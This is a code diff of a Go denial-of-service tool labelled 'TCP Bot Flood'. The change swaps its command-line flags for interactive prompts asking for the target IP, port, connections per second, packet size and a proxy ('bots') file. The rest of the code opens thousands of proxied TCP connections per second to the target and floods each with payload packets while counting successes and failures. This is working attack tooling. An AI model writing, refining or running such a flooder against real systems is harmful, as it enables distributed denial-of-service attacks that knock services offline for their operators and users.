@@ -2,10 +2,10 @@ package main
 
 import (
 	"bufio"
-	"flag"
 	"fmt"
 	"os"
 	"os/signal"
+	"strconv"
 	"strings"
 	"sync/atomic"
 	"syscall"
@@ -14,21 +14,51 @@ import (
 	"golang.org/x/net/proxy"
 )
 
+func askInput(prompt string, defaultVal string) string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Printf("%s (default: %s): ", prompt, defaultVal)
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSpace(input)
+	if input == "" {
+		return defaultVal
+	}
+	return input
+}
+
 func main() {
-	target := flag.String("target", "127.0.0.1", "Target IP")
-	port := flag.Int("port", 8443, "Target port")
-	rps := flag.Int("rps", 15000, "Connections per second")
-	timeout := flag.Duration("timeout", 2*time.Second, "Connection timeout")
-	TCPPacketSize := flag.Int("size", 2469, "Bytes per packet")
-	TCPPacketsPerConnection := flag.Int("pps", 1000, "Packets per connection")
-	WorkingBotsFile := flag.String("proxies", "working.txt", "File with proxies")
-	flag.Parse()
+	fmt.Println("Select attack method:")
+	fmt.Println("1) TCP Bot Flood (default)")
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Enter number: ")
+	methodInput, _ := reader.ReadString('\n')
+	methodInput = strings.TrimSpace(methodInput)
+	method := "TCP Bot Flood"
+	if methodInput != "" && methodInput != "1" {
+		fmt.Println("Invalid input, defaulting to TCP Bot Flood")
+	}
 
-	addr := fmt.Sprintf("%s:%d", *target, *port)
-	fmt.Printf("Testing Targ => %s:%d at %d connections/sec, %d bytes per packet, %d packets per connection.\nCtrl+C to stop.\n",
-		*target, *port, *rps, *TCPPacketSize, *TCPPacketsPerConnection)
+	fmt.Printf("Selected method: %s\n\n", method)
 
-	file, err := os.Open(*WorkingBotsFile)
+	target := askInput("Target IP", "127.0.0.1")
+	InpPortStr := askInput("Target Port", "8443")
+	InpConStr := askInput("Connections per second", "15000")
+	InpTimeoutStr := askInput("Timeout (seconds)", "2")
+	InpPacketS := askInput("Packet size (bytes)", "2469")
+	InpPPS := askInput("Packets per connection", "1000")
+	InpBots := askInput("Proxy file path", "working.txt")
+
+	port, _ := strconv.Atoi(InpPortStr)
+	rps, _ := strconv.Atoi(InpConStr)
+	timeoutSec, _ := strconv.Atoi(InpTimeoutStr)
+	packetSize, _ := strconv.Atoi(InpPacketS)
+	packetsPerConn, _ := strconv.Atoi(InpPPS)
+	timeout := time.Duration(timeoutSec) * time.Second
+
+	addr := fmt.Sprintf("%s:%d", target, port)
+	fmt.Printf("\nTarget: %s at %d connections/sec, %d bytes per packet, %d packets per connection.\nCtrl+C to stop.\n",
+		addr, rps, packetSize, packetsPerConn)
+
+	file, err := os.Open(InpBots)
 	if err != nil {
 		fmt.Printf("Failed to open proxy file: %v\n", err)
 		return
@@ -43,7 +73,6 @@ func main() {
 			proxies = append(proxies, line)
 		}
 	}
-
 	if len(proxies) == 0 {
 		fmt.Println("No proxies found. Exiting.")
 		return
@@ -51,12 +80,12 @@ func main() {
 
 	var success uint64
 	var failure uint64
-	payload := make([]byte, *TCPPacketSize)
+	payload := make([]byte, packetSize)
 
-	ticker := time.NewTicker(time.Second / time.Duration(*rps))
+	ticker := time.NewTicker(time.Second / time.Duration(rps))
 	defer ticker.Stop()
-	NewTimeTicker := time.NewTicker(1 * time.Second)
-	defer NewTimeTicker.Stop()
+	statsTicker := time.NewTicker(1 * time.Second)
+	defer statsTicker.Stop()
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
@@ -81,10 +110,9 @@ func main() {
 					return
 				}
 				defer conn.Close()
+				conn.SetDeadline(time.Now().Add(timeout))
 
-				conn.SetDeadline(time.Now().Add(*timeout))
-
-				for i := 0; i < *TCPPacketsPerConnection; i++ {
+				for i := 0; i < packetsPerConn; i++ {
 					_, err := conn.Write(payload)
 					if err != nil {
 						atomic.AddUint64(&failure, 1)
@@ -93,7 +121,7 @@ func main() {
 					atomic.AddUint64(&success, 1)
 				}
 			}()
-		case <-NewTimeTicker.C:
+		case <-statsTicker.C:
 			s := atomic.SwapUint64(&success, 0)
 			f := atomic.SwapUint64(&failure, 0)
 			fmt.Printf("Success: %d, Failed: %d\n", s, f)
